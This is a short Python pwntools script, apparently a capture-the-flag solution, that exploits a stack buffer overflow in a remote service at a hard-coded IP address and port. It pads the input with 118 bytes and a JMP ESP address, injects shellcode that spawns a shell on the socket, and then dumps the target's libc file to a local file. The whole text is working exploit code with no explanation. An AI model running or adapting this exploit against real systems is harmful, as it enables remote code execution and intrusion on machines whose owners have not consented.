import pwn
import sys
from pwn import asm
import socket

shellcode = pwn.asm("""
mov eax, esp
""" + pwn.shellcraft.i386.mov('ebx', 8410) + """
add eax, ebx
mov ebp, dword ptr [eax+6]
""" + pwn.shellcraft.i386.linux.dupsh('ebp'))

assert "\x00" not in shellcode
assert len(shellcode) <= 118

JMP_ESP = 0x080488b0

s = pwn.remote('54.163.248.69', 9000)
s.send('echo ' + 'a' * 118 + pwn.p32(JMP_ESP) + shellcode + '\n')
print s.recv(1024)
#s.interactive()
s.send("cat /lib/i386-linux-gnu/libc.so.6\n\n")
f = open('libc.so', 'w')
while True:
    d = s.recv(1024)
    if len(d) == 0:
        break
    f.write(d)
    f.flush()
    sys.stdout.write('.')
    sys.stdout.flush()
